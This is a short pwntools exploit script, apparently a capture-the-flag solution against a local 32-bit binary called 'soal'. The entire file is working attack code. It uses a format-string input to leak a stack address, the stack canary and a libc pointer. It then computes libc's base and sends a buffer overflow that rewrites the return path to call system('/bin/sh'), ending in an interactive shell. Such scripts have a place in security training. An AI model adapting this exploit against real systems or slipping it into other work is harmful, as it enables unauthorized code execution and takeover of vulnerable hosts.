from pwn import *
elf = ELF('./soal', checksec=False)
libc = ELF('/opt/glibc/x86/2.29/lib/libc.so.6', checksec=False)

p = elf.process()
p.sendlineafter(b'>>', '%{0:d}$p|%{1:d}$p|%{2:d}$p'.format(16,83,6).encode())
leak = p.recvline().strip()[4:-1].decode()
libc.address = eval(leak.split('|')[2]) + 0x39ef8 - libc.sym['system']
canary = eval(leak.split('|')[1])
stack = eval(leak.split('|')[0]) - (0x7e-4)
log.info('canary 0x%x'%canary)
log.info('base 0x%x'%libc.address)
log.info('stack  0x%x'%stack)
payload = b''.join([
    p32(libc.sym['system']),
    p32(0),
    p32(next(libc.search(b'/bin/sh'))),
    cyclic(0x136-(4*3)),
    p32(canary),
    p32(stack),    # ecx - 4
    p32(0),
    p32(0)
])
p.sendline(payload)
p.interactive()